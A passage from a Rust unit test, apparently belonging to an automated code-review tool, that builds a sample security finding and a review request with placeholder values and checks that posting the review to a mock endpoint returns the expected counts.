            title: "Test finding".into(),
            description: "Desc".into(),
            severity: crate::finding::Severity::Medium,
            category: crate::category::Category::Security,
            source: crate::finding::Source::LocalAst,
            line_start: 41,
            line_end: 41,
            evidence: vec!["src/auth.rs".into()],
            calibrator_action: None,
            similar_precedent: vec![],
            canonical_pattern: None,
            suggested_fix: None,
            based_on_excerpt: None,
            reasoning: None,
            llm_confidence: None,
            confidence: None,
            cited_lines: None,
            grounding_status: None,
            grounding_confidence: None,
            model_agreement: None,
            rule_id: None,
            judge_verdict: None,
            judge_confidence: None,
            precision_tier: None,
            in_diff: Some(true),
        };

        let client = reqwest::Client::new();
        let req = PostReviewRequest {
            owner: "test".into(),
            repo: "repo".into(),
            pr_number: 1,
            token: "fake-token".into(),
            findings: vec![f],
            diff_text: diff.into(),
            version: "0.27.0".into(),
            run_id: "01TEST".into(),
            commit_sha: "abc123".into(),
            api_base_url: Some(base_url),
        };

        let result = post_review(&client, &req).await.unwrap();
        assert_eq!(result.review_id, 42);
        assert_eq!(result.inline_count, 1);
        assert_eq!(result.body_count, 0);

        let _ = handle.join();
    }
}
